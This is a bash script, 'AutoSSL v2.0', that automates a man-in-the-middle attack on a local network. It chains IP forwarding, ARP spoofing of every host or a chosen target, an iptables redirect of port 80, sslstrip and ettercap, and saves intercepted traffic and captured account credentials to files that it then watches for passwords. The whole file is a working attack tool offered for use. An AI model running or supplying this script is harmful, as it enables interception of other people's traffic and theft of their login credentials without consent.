#!/bin/bash

show_help(){
	clear
	echo -e "\t\t\t\tWelcome to AutoSSL help page"
	echo -e "For running this script make sure you have installed:\n"
	echo -e "\t--dsniff"
	echo -e "\t--sslstrip"
	echo -e "\t--xterm"
	echo -e "\t--ettercap\n"
	echo -e "Usage: "
	echo -e "\t-h			show help"
	echo -e "\t-v			show version"
	read
	exit
}

show_version(){
	clear
	echo -e "\t\tAutoSSL v2.0 made by TurKiSsh"
	read
	exit
}


if [ "$#" > 0 ]; then
    arg_1=$1
    case $arg_1 in
      "--help"|"-h") show_help;;
      "--version"|"-v") show_version;;
    esac
fi


user=`whoami`
if [ "$user" != "root" ] ; then
	clear
	echo -e "\nROOT PRIVILEGES REQUIRED"
	read
	exit
fi


clear
echo -e "\t\t\t\tAUTO SSLSTRIP"
echo -e "\t\t  **For any error the check --help option**\n\n"

echo "Setting ip fowarding"

echo "1" > /proc/sys/net/ipv4/ip_forward
sleep 1
echo -e "\nCleaning old files"

mkdir -p oldFiles
mv cuentas.txt captura.ssl ./oldFiles/ 2>/dev/null
rm -f cuentas.txt
rm -f captura.ssl
echo

echo -e "----------------------------------------------------------------\n" 

echo -n "ROUTER ADDRESS ( ip ):  "

read routerip

echo -n "Interface which we want to use (ej: wlan0,eth0):  "
 
read iface

echo -n "Sniff all the hosts?(y/n):  "

read opcion1

if [ "$opcion1" = "y" ] ; then

xterm -geometry 60x15+1+300 -T "ARP Spoof" -e arpspoof -i $iface $routerip &

else

echo -n "Which is the target? (ip) :  "

read target

xterm -geometry 60x15+1+300 -T "ARP Spoof" -e arpspoof -i $iface -t $target $routerip &

fi

sleep 2

echo -e "\n----------------------------------------------------------------" 

echo -e "\nSetting ip tables\n"  

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000 &

echo -e "IP tables routed\n" 

sleep 1

echo "---------------------------------------------------------------" 

echo 

echo "Running Sslstrip saving in captura.ssl"
 
xterm -geometry 60x15+375+300 -T "Sslstrip" -e sslstrip -k -w captura.ssl &

echo

sleep 1

echo "---------------------------------------------------------------" 

echo

echo "Running Ettercap saving in cuentas.txt"

xterm -geometry 80x15+750+300 -T "Ettercap" -e ettercap -T -q -m cuentas.txt -i $iface &

echo

sleep 1

echo "---------------------------------------------------------------"

xterm -geometry 200x20+1+600 -T "Capture of data" -e 'tail -f captura.ssl | grep [www,pass]' &

echo -e "\n                                                TurKiSsh\n\n\n"